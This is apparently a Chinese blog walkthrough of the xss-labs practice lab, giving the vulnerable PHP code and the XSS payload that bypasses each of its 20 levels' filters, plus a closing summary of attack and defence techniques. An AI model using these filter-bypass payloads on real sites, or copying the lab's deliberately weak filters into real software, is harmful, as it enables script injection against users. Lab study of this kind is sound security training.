@[TOC]

## level-1 无过滤机制

> http://127.0.0.1/xss-labs/level1.php?name=test

1. 我们先看一看页面：![在这里插入图片描述](https://img-blog.csdnimg.cn/006600c761cb4b7f947392d61108d0ab.jpeg#pic_center)
观察发现，URL中可以输入参数，而页面会回显参数以及参数的长度。
2. 我们看一下页面源码，发现我们输入的内容会被直接拼接在页面中。![在这里插入图片描述](https://img-blog.csdnimg.cn/25f2769cb7454278a1cb5b4ffe5fe44e.jpeg#pic_center)
3. 因此我们将URL中的中的 “test” 修改为 “`<script>alert(1)</script>`，成功弹窗。
4. 后端代码如下（我们输入的参数在被get到的时候没有经过特殊的过滤处理）：

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```
## level-2 闭合标签

> http://127.0.0.1/xss-labs/level2.php?keyword=test
1. 这一关有了输入框，我们先输入`<script>alert(1)</script>`试一试，发现没有成功![在这里插入图片描述](https://img-blog.csdnimg.cn/6d75b105079d454e90271a3e6d46c781.jpeg#pic_center)
2. 我们在第一步的基础上进页面源码看一看：![在这里插入图片描述](https://img-blog.csdnimg.cn/dbc333f4af474b70a8ff53872f1e8ea4.jpeg#pic_center)
3. 我们发现，在页面上输出的内容被转义了，但是value属性中的并没有被转移，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的。因此我们想办法去闭合，我们输入`"><script>alert(1)</script>`，进行闭合，闭合之后的为“`<input name="keyword" value=""><script>alert(1)</script>">`”，成功弹窗。
4. 我们看一看后端代码：（用 htmlspecialchars() 对输入的字符进行了转义）
[点此学习 htmlspecialchars() 函数](https://www.runoob.com/php/func-string-htmlspecialchars.html)

```php
<?php
    ini_set("display_errors", 0);
    $str = $_GET["keyword"];
    echo "<h2 align=center>没有找到和" . htmlspecialchars($str) . "相关的结果.</h2>" . '<center>
<form action=level2.php method=GET>
<input name=keyword  value="' . $str . '">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
    ?>
```

## level-3 单引号闭合+htmlspecialchars()

> http://127.0.0.1/xss-labs/level3.php?writing=wait

1. 我们依旧是先输入`<script>alert(1)</script>`，没有作用，查看网页源码，发现页面输出内容和 value 属性值都被转义了![请添加图片描述](https://img-blog.csdnimg.cn/ed64ae1559ca48c1b4cb0d0b037edf6d.jpeg)
2. 观察发现，上图中的单引号并没有被转义，我们将单引号闭合，并使用一种不需要尖括号等的JS方法，我们输入 `'onclink='alert(1)` ，成功弹窗。
当我们输入之后的完整代码为：`<input name="keyword" value=' ' onclick='alert(1)'>`
（也可以 `'onclick='javascript:alert(1)` ）
3. 我们看一看后端源码：（确实是对两个地方都进行了转义）![请添加图片描述](https://img-blog.csdnimg.cn/fd6f1a9ae4894276b695aa75f61fc5d9.jpeg)

## level-4 双引号闭合+添加事件

> http://127.0.0.1/xss-labs/level4.php?keyword=try harder!

1. 我们依旧是 `<script>alert(1)</script>` 测试，查看网页源码，发现尖括号直接就没有了![](https://img-blog.csdnimg.cn/6d2bed3273d24416927b928d0ea3b3d9.jpeg#pic_center)
2. 那我们还是像上一关一样，使用不需要尖括号的写法，但是上一关是单引号闭合，而这一关是双引号，那我们就改成 `"onclick="alert(1)` 或者 `"onclick="javascript:alert(1)` ，成功弹窗。
3. 我们看一看后端代码：发现是使用 replace 对尖括号等进行了替换。

```php
$str = $_GET["keyword"];
$str2 = str_replace(">", "", $str);
$str3 = str_replace("<", "", $str2);
```

## level-5 JavaScript 伪协议

> http://127.0.0.1/xss-labs/level5.php?keyword=find a way out!

1. 我们还是 `<script>alert(1)</script>` ，然后看页面源码，发现 value 属性值变成了 `<scr_ipt>alert(1)</script>`（下划线）
 我们再尝试 `">onclick="alert(1)` ，查看页面源码， value 处成了 `value="">o_nclick="alert(1)"`（下划线）
    说明后端会对 script 和 onclick 进行过滤。
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/dea240782bec42d281026ebfe1d5c32d.jpeg#pic_center)

 2. 查资料，得知应该用 a 标签绕过，使用 JS伪协议( `javascript:alert(1)` )绕过，简单说就是把 javascript:  后面的代码当成  javascript 来执行。
 3. 因此我们输入 `"><a href=javascript:alert(1)>` （用 "> 进行闭合），成功弹窗。
 4. 看看后端代码：
```php
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("<script", "<scr_ipt", $str);
$str3 = str_replace("on", "o_n", $str2);
```

## level-6 大小写绕过

> http://127.0.0.1/xss-labs/level6.php?keyword=break it out!

1. （这一步和上一关一模一样）我们还是 `<script>alert(1)</script>` ，然后看页面源码，发现 value 属性值变成了 `<scr_ipt>alert(1)</script>`（下划线）
 我们再尝试 `">onclick="alert(1)` ，查看页面源码， value 处成了 `value="">o_nclick="alert(1)"`（下划线）
    说明后端会对 script 和 onclick 进行过滤。
2. 我们像上一关一样使用 JS伪协议，发现依旧不行，居然 href 也被替换成了 hr_ef 
3. 但是它并没有做大小写过滤，所以我们可以使用以下三种方法：
- `"><sCript>alert()</sCript><"`
- `"Onfocus=javascript:alert()"` （这种和下面那种只是少了空格而已，但是不行，至于为啥，请看第四步）
- `"Onfocus=javascript:alert() "`
- `"><a hRef=javascript:alert()><"`


 4. 我们来解决上一步中产生的问题：为什么 `"Onfocus=javascript:alert()"` 不可以，但是 `" Onfocus=javascript:alert() "`可以（二者只是差了 alert() 后面的空格而已）。请看下图：
![请添加图片描述](https://img-blog.csdnimg.cn/a245dece982f4baca718b953d54659a4.jpeg)
![请添加图片描述](https://img-blog.csdnimg.cn/374fd4ad6fda462baa8b9efcb0b996a5.jpeg)
看出区别了吧，没有空格的时候 alert() 后面的两个引号形成了闭合，而有空格的时候，则一切正常。

5. 我们看一看后端代码：

```php
 $str = $_GET["keyword"];
 $str2 = str_replace("<script", "<scr_ipt", $str);
 $str3 = str_replace("on", "o_n", $str2);
 $str4 = str_replace("src", "sr_c", $str3);
 $str5 = str_replace("data", "da_ta", $str4);
 $str6 = str_replace("href", "hr_ef", $str5);
```
## level-7 双写绕过

> http://127.0.0.1/xss-labs/level7.php?keyword=move up!
1. 我们依旧是尝试 `<script>alert()</script>`，结果直接把 `<script></script>` 给没了，这很可能是检测到 script 标签然后进行了替换，那我们就尝试双写绕过
![请添加图片描述](https://img-blog.csdnimg.cn/22535d516b5547f6a6bdea12dd5987e3.jpeg)
2. 我们尝试一下内容：成功弹窗
- `"> <a hrehreff=javasscriptcript:alert()>`
- `"><scscriptript>alert(1)</sscriptcript>`

3. 我们看一看后端代码：依旧是做了替换（问题在于只过滤了一次）
```php
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("script", "", $str);
$str3 = str_replace("on", "", $str2);
$str4 = str_replace("src", "", $str3);
$str5 = str_replace("data", "", $str4);
$str6 = str_replace("href", "", $str5);
```

## level-8 编码绕过

> http://127.0.0.1/xss-labs/level8.php?keyword=nice try!
1. 我们测试发现，大小写绕过 双写绕过 JS伪协议 ……各种东西都被限制了，然后我们输入内容之后点击 “友情链接” 会跳转，那我们就尝试在这里做动作。
2. 查资料：我们能利用 href 的隐藏属性自动 Unicode 解码，我们可以插入一段 js 伪协议 `javascript:alert()`
我们将其URL编码，得到：`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;`
成功弹窗![在这里插入图片描述](https://img-blog.csdnimg.cn/93c758d92ef9490c91d44ca148ad346a.jpeg#pic_center)


3. 后台源代码分析。将 keyword 提交的变量转换为小写，替换关键字 script、on、src、data、href、"，然后输出在a标签的href属性中。
```php
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("script", "scr_ipt", $str);
$str3 = str_replace("on", "o_n", $str2);
$str4 = str_replace("src", "sr_c", $str3);
$str5 = str_replace("data", "da_ta", $str4);
$str6 = str_replace("href", "hr_ef", $str5);
$str7 = str_replace('"', '&quot', $str6);
```

## level-9 检测关键字

> http://127.0.0.1/xss-labs/level9.php?keyword=not bad!


1. 依旧是“友情链接”，那我们就把上一关的拿过来试一试，结果提示“您的链接不合法？有没有！”，链接合法，我们考虑一下 http 或者 https 协议，但是其实这里会有两种可能，一种是开头必须是 http 等字样，另一种是字符串中不管哪里有 http 等字样就行，看一看后端发现这一关是第二种情况，那就很舒服了（问一下  第一种情况怎么办）。![请添加图片描述](https://img-blog.csdnimg.cn/72346ce9029e48109181923325fd9192.jpeg)

2. 那我们先尝试一下`javascript:alert()http://www.baidu.com`但是这首先就不符合语法，应该在 http 前面加注释，（反正不执行，后端只是检测一下有没有这个字样）所以我们应该改成`javascript: alert(1) //http://www.baidu.com`![请添加图片描述](https://img-blog.csdnimg.cn/873d0e6133c54980828f2f179b4cb889.jpeg)

3. 但是输入之后并不行，怎么回事，看看页面源码，发现 href 中的 “ script ” 被插入了下划线![请添加图片描述](https://img-blog.csdnimg.cn/9fa3139472df4d918c3a08010776b8be.jpeg)
4. 这应该是后端匹配到 script 然后做了替换，因为是在 href 里面，那我们就进行 Unicode 编码，（注意别把html给编码了）`javasc&#114;ipt:alert(1)//http://`
5. 我们看一看后端代码：

```php
  $str = strtolower($_GET["keyword"]);
  $str2 = str_replace("script", "scr_ipt", $str);
  $str3 = str_replace("on", "o_n", $str2);
  $str4 = str_replace("src", "sr_c", $str3);
  $str5 = str_replace("data", "da_ta", $str4);
  $str6 = str_replace("href", "hr_ef", $str5);
  $str7 = str_replace('"', '&quot', $str6);
  echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="' . htmlspecialchars($str) . '">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
  ?>
  <?php
  if (false === strpos($str7, 'http://')) {
    echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
  } else {
    echo '<center><BR><a href="' . $str7 . '">友情链接</a></center>';
  }
  ?>
```

6. 看到了吧，使用了 strpos() 函数进行了匹配   [点我学习 strpos() 函数](https://www.w3school.com.cn/php/func_string_strpos.asp)

## level-10 隐藏信息

> http://127.0.0.1/xss-labs/level10.php?keyword=well done!
1. 我们进网页源码看一看，发现有三个 input 标签被隐藏了，但是我们不知道这三个标签哪一个可以利用，那么根据他们的name构造传值，让它们的type改变，不再隐藏，谁出来了谁就能利用， `t_link" type='text'>//&t_history" type='text'>//&t_sort=" type='text'>//`试一试，发现第三个被修改了（或者是输入`a&t_link=aa&t_history=bb&t_sort=cc`回车后发现页面源码中之后 t_sort 被改动了）
![请添加图片描述](https://img-blog.csdnimg.cn/5ea3098907914cf097592a12d4aeba58.jpeg)
![请添加图片描述](https://img-blog.csdnimg.cn/44a88648193e4daa94ac5490f0ae9c6b.jpeg)
2. 那我们呢就直接构造payload：`&t_sort=" type='text' onclick=javascript:alert(12)>//`，成功
3. 看一看后端

```php
    <?php
    ini_set("display_errors", 0);
    $str = $_GET["keyword"];
    $str11 = $_GET["t_sort"];
    $str22 = str_replace(">", "", $str11);
    $str33 = str_replace("<", "", $str22);
    echo "<h2 align=center>没有找到和" . htmlspecialchars($str) . "相关的结果.</h2>" . '<center>
<form id=search>
<input name="t_link"  value="' . '" type="hidden">
<input name="t_history"  value="' . '" type="hidden">
<input name="t_sort"  value="' . $str33 . '" type="hidden">
</form>
</center>';
    ?>
```
4. 发现 `$_GET["t_sort"]` 经过删除尖括号等操作，最终放到了第三个 input 标签里。

## level-11 referer

> http://127.0.0.1/xss-labs/level11.php?keyword=good job!
1. 我们看看页面源码，发现有四个被隐藏的 input 标签，相比于上一关多出了一个叫 t_ref 的标签，ref，有没有想到什么，当然是 referer。（并且这个标签值为第10关URL）
> Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：Referer=http://www.google.com

由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。![请添加图片描述](https://img-blog.csdnimg.cn/ac273b6fd3f344fab88a76bb34a39b97.jpeg)




2. 既然如此，那我们就试试用 Burp 抓包，然后修改 referer，呃当然是先去第十关，在弹窗成功那儿（跳转11关的时候）抓包。如图为抓到的数据包：![请添加图片描述](https://img-blog.csdnimg.cn/0db3d9be8e0c4d8f821ac67bd0588889.jpeg)

3. 我们将数据包修改为`referer:&t_sort=" type='text' onclick=javascript:alert()>//`，然后放行，发现页面确实有了一个框，点击成功弹窗![请添加图片描述](https://img-blog.csdnimg.cn/94286fe10d48428386b109e935bdc0b3.jpeg)
4. 最后我们来看下后端代码：发现确实是`$str11 = $_SERVER['HTTP_REFERER'];`

```php
    ini_set("display_errors", 0);
    $str = $_GET["keyword"];
    $str00 = $_GET["t_sort"];
    $str11 = $_SERVER['HTTP_REFERER'];
    $str22 = str_replace(">", "", $str11);
    $str33 = str_replace("<", "", $str22);
    echo "<h2 align=center>没有找到和" . htmlspecialchars($str) . "相关的结果.</h2>" . '<center>
<form id=search>
<input name="t_link"  value="' . '" type="hidden">
<input name="t_history"  value="' . '" type="hidden">
<input name="t_sort"  value="' . htmlspecialchars($str00) . '" type="hidden">
<input name="t_ref"  value="' . $str33 . '" type="hidden">
</form>
</center>';
```

## level-12 user-agent

> http://127.0.0.1/xss-labs/level12.php?keyword=good job!

1. 还是看页面源码，这次的又成了 t_ua ，UA，后面的值也一看就是UA，那我们启动Burp！![请添加图片描述](https://img-blog.csdnimg.cn/c8cb30fbf77a4fd38abca01ebd368567.jpeg)
2. 如图为我们抓到的数据包：![请添加图片描述](https://img-blog.csdnimg.cn/79d371d7a3b94627a5547cf7978c1f1c.jpeg)
3. 我们对 UA 的值进行修改：`"type="text" onmousemove="alert()`![请添加图片描述](https://img-blog.csdnimg.cn/e695329be21540b291f200b3648ffaf7.jpeg)
4. 修改后放行，成功弹窗，我们看看后端代码：（`$str11 = $_SERVER['HTTP_USER_AGENT'];`）

```php
    ini_set("display_errors", 0);
    $str = $_GET["keyword"];
    $str00 = $_GET["t_sort"];
    $str11 = $_SERVER['HTTP_USER_AGENT'];
    $str22 = str_replace(">", "", $str11);
    $str33 = str_replace("<", "", $str22);
    echo "<h2 align=center>没有找到和" . htmlspecialchars($str) . "相关的结果.</h2>" . '<center>
<form id=search>
<input name="t_link"  value="' . '" type="hidden">
<input name="t_history"  value="' . '" type="hidden">
<input name="t_sort"  value="' . htmlspecialchars($str00) . '" type="hidden">
<input name="t_ua"  value="' . $str33 . '" type="hidden">
</form>
</center>';
```
## level-13 cookie

> http://127.0.0.1/xss-labs/level13.php?keyword=good job!
1. 先看看前端代码，这次又换成了 t_cook ，呃，cookies？看一看 cookies ，长得确实很奇怪。那就还是 Burp 改包。![请添加图片描述](https://img-blog.csdnimg.cn/9ee4ca3b27514fe78dc99572a4c487b8.jpeg)
![请添加图片描述](https://img-blog.csdnimg.cn/512e9f32bf4548a7856b040083edc9eb.jpeg)
2. 我们在Burp抓到数据包之后，将 cookie 修改为`"type='text' onclick=javascript:alert(1)//`，如图：![请添加图片描述](https://img-blog.csdnimg.cn/6ed8cbc290f840e78cb391c6e90ba325.jpeg)
3. 放行后果然有了一个框，也成功弹窗。![请添加图片描述](https://img-blog.csdnimg.cn/5f6fc0a4a91941b295eec48284ed7b29.jpeg)
4. 看看后端代码：（`$str11 = $_COOKIE["user"];`）

```php
    setcookie("user", "call me maybe?", time() + 3600);
    ini_set("display_errors", 0);
    $str = $_GET["keyword"];
    $str00 = $_GET["t_sort"];
    $str11 = $_COOKIE["user"];
    $str22 = str_replace(">", "", $str11);
    $str33 = str_replace("<", "", $str22);
    echo "<h2 align=center>没有找到和" . htmlspecialchars($str) . "相关的结果.</h2>" . '<center>
<form id=search>
<input name="t_link"  value="' . '" type="hidden">
<input name="t_history"  value="' . '" type="hidden">
<input name="t_sort"  value="' . htmlspecialchars($str00) . '" type="hidden">
<input name="t_cook"  value="' . $str33 . '" type="hidden">
</form>
</center>';
```
## level-14 exif

> http://127.0.0.1/xss-labs/level14.php
1. 看了看网上，好多说这个题有问题，页面也正常显示不出来。我们就直接看看后端代码吧。

```html
<body>
    <h1 align=center>欢迎来到level14</h1>
    <center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center>
    <center>这关成功后不会自动跳转。成功者<a href=/xsschallenge/level15.php?src=1.gif>点我进level15</a></center>
</body>
```
2. （payload是一张图片马，考到了CTF中的杂项中隐写 Exif 隐藏信息）大致意思就是通过修改 iframe 调用的文件（ src ）来实现 xss 注入。上传的图片的 EXIF 中包含恶意代码，然后当图片被解析的时候，其中EXIF中的代码就会被执行。![请添加图片描述](https://img-blog.csdnimg.cn/15366b2c3ec24608a8572b99e5600511.jpeg)

3. 去了解一下 EXIF 吧
> exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。

## level-15 ng-include

> http://127.0.0.1/xss-labs/level15.php?src=1.gif

1. 我们先尝试将 url 中的 1.gif 修改为 `<script>alert()</script>`，然后看看页面源码，发现除了有个`<!-- ngInclude: <script>alert()</script> -->`也没有别的东西了，那我们就搜一搜啥是 nginclude![在这里插入图片描述](https://img-blog.csdnimg.cn/3cb6598cf5c243eeb84f6ade9ad0a24e.jpeg#pic_center)


> ng-include 指令用于包含外部的 HTML 文件。
> 包含的内容将作为指定元素的子节点。
> ng-include 属性的值可以是一个表达式，返回一个文件名。
> 默认情况下，包含的文件需要包含在同一个域名下。

2. 那也就是说，我们只要使 ng-include 包含一个弹窗页面就行，而且“默认情况下，包含的文件需要包含在同一个域名下”。那我们就把第一关搬过来。（`http://127.0.0.1/xss-labs/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E`）![在这里插入图片描述](https://img-blog.csdnimg.cn/5c3dd21524b245ab9b83d80675690c5a.jpeg#pic_center)

3. 而直接把上述内容替换 1.gif 回车后发现没有任何作用，这是因为没有加单引号，必须用单引号包围起来。
回车后我们呢看到页面中确实有了整个第一关的东西，页面源码里面也包含了第一关的东西，但是依旧没有弹窗。![请添加图片描述](https://img-blog.csdnimg.cn/cd004853367f4b1e87e5f1b53eaae87b.jpeg)
![请添加图片描述](https://img-blog.csdnimg.cn/8f675a9ed5d644aa94f3090466ff23d4.jpeg)
4. 这种情况很可能是 script标签 被页面过滤掉了。那我们换一种方式：（注意，这里不能包涵那些直接弹窗的东西如`<script>`，但是可以包涵那些标签的东西比如`<a>`、`<input>`、`<img>`、`<p>`标签等等，这些标签是能需要我们手动点击弹窗的）
方法一：`http://127.0.0.1/xss-labs/level1.php?name=a<img src=1 onerror=alert()>`
方法二：`http://127.0.0.1/xss-labs/level1.php?name=<p onmousedown=alert()>AAA</p>`
方法三：`http://127.0.0.1/xss-labs/level1.php?name=<a href="javascript:alert()">`
等等………………
5. 看一看后端
```php
<?php
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:' . htmlspecialchars($str) . '"></span></body>';
?>
```
6. 还有就是了解一下 angular （前端框架）因为这个 ng-include 是它的东西

## level-16 空格实体转义

> http://127.0.0.1/xss-labs/level16.php?keyword=test

1. 因为前面有 center 标签，我就想着先把它闭合掉，`</center><script>alert()</script>` 但是不管是 / 还是 script 都被过滤了：![在这里插入图片描述](https://img-blog.csdnimg.cn/c3d267fec6e64698a4f3fb3c44b39525.jpeg#pic_center)
2. 那好，那我试一试上一关的`<img src=1 onerror=alert()>`，但是看起来空格也被弄了![请添加图片描述](https://img-blog.csdnimg.cn/423317d747744e9482c5666015d39ad5.jpeg)

> HTML提供了5种空格实体（space entity），它们拥有不同的宽度，非断行空格（`&nbsp;`）是常规空格的宽度，可运行于所有主流浏览器。其他几种空格（ `&ensp; &emsp; &thinsp; &zwnj;&zwj;`）在不同浏览器中宽度各异。

3. 既然如此，那我们就直接把 **换行符** 给 URL 编码一下，%0A，用 %0A 替换空格，成功弹窗。至于为什么不是用空格 URL 编码，而是用换行符 这是因为用换行符替换空格效果一样 (在 html 中，不论加多少空格或者回车，都会被转成一个空格)![在这里插入图片描述](https://img-blog.csdnimg.cn/5afbaa21ba3e40fe8cdea3c99cbf1ee8.jpeg#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac72ab4a98404f4d9efbee3780f21841.jpeg#pic_center)
4. 也就是说，我们最后输入的为 `<img%0Asrc=1%0Aonerror=alert()>`，成功弹窗。
5. 看看后端代码：

```php
<?php
    ini_set("display_errors", 0);
    $str = strtolower($_GET["keyword"]);
    $str2 = str_replace("script", "&nbsp;", $str);
    $str3 = str_replace(" ", "&nbsp;", $str2);
    $str4 = str_replace("/", "&nbsp;", $str3);
    $str5 = str_replace("	", "&nbsp;", $str4);
    echo "<center>" . $str5 . "</center>";
?>
```
## level-17 参数拼接

> http://127.0.0.1/xss-labs/level17.php?arg01=a&arg02=b

1. 我们先看看页面源码，发现了一个 embed 标签 ，而且里面的 src 就是我们 URL 中的东西。![在这里插入图片描述](https://img-blog.csdnimg.cn/a2bbf8b0c6ad432493a6de401c5af6ec.jpeg#pic_center)
2. 那我们就尝试去闭合掉它，我们在URL的最后面加上 `" onmouseover='alert()'`，当鼠标移动到图片上面时成功弹窗。
3. 了解一下 embed 标签：

> embed 标签定义了一个容器，用来嵌入外部应用或者互动程序（插件）。

> embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会有块错误的区域。也可以绑定各种事件，比如尝试绑定一个onmouseover事件。后台看代码用了htmlspecialchars，所以直接写标签是不行的。embed标签基本不怎么用了，所以这一关就简单了解一下即可。

4. 后端代码：

```php
<?php
ini_set("display_errors", 0);
echo "<embed src=index.png?" . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . " width=100% heigth=100%>";
?>
```

## level-18 参数拼接

> http://127.0.0.1/xss-labs/level18.php?arg01=a&arg02=b

1. 和17关一模一样

## level-19 flash xss

> http://127.0.0.1/xss-labs/level19.php?arg01=a&arg02=b

1. 首先从页面源码来看，也是 embed 标签
2. 别人说：至于为啥这里不能用前面两关的方法了？是因为源码把上面漏洞闭合了,加了一对双引号，绕不出去了（只能用 " 闭合，但是 " 会被转义，无法闭合，所以即使看起来是好的，也无法弹框）
3. 后端长这样：
```php
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?' . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . '" width=100% heigth=100%>';
?>
```
4. 貌似涉及到 flash 反编译啥的，我也不会，附上偷来的 payload：`arg01=version&arg02=<a href="javascript:alert(1)">123</a>`
## level-20 flash xss
1. 偷来的 payload：`arg01=id&arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)`
2. 后端：

```php
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?' . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . '" width=100% heigth=100%>';
?>
```

4. 大佬的文章：[xss-labs 第20关](https://blog.csdn.net/u014029795/article/details/103217680)

## 总结
（小声说一句，这部分也是偷的）

**反射型XSS测试步骤总结：**
1. 检测输入变量，确认每个 web 页面中用户可自定义的变量，如 HTTP 参数、POST 数据、隐藏表单字段值、预定义的 radio 值或选择值
2. 分别确认每个输入变量是否存在 xss漏洞。变量输入处输入 poc，查看返回的 web页面的 html 中 poc 代码是否被过滤，浏览器是否响应 poc，若存在过滤，进行测试查看能否进行绕过。

**XSS的攻防：**
1. 攻：利用<>标记，构造`<script>`标签可执行 javascript的xss代码。
防：xss过滤函数需过滤`<><script></script>`等字符。
2. 攻：利用 html 标签属性支持 javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。
防：xss 过滤函数需过滤JavaScript等关键字。
3. 利用 javascript 在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对 javascript 的关键字的过滤。
4. 攻：利用html标签属性值支持ascii码，对标签属性值进行转码进行规则库的绕过。
防：xss 过滤函数需过滤&#\等字符。
5. 利用事件处理函数，触发事件，执行xss代码。例如`<img src='#' onerror=alert(/xss/)>`,当浏览器响应页面时，找不到图片的地址，触发onerror事件。
6. 攻：利用css执行javascript代码，css代码中利用expression触发xss漏洞。如下所示：

```html
<div style="width: expression(alert('xss'));>

<img src="#" style="xss:expression(alert(/xss/));">

<style>body {background-image:expression(alert("xss"));}</style>

<div style="list-style-image:url(javascript:alert('xss'))">
```

css代码中利用@import触发xss

```html
<stytle>

@import 'javascript:alert("XSS")';

</stytle>
```

css代码中使用@import和link方式导入外部含有xss代码的样式表文件

```html
<link rel="stytlesheet" href="http://www.***.com/a.css">

<stytle type='text/css'>@import url(http://www.*.com/a.css);</style>
```

防：xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字。

7. 利用大小写混淆、使用单引号、不使用引号、使用/插入在img src中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数
8. 利用字符编码。javascript支持unicode、escapes、十六进制、八进制等编码形式。

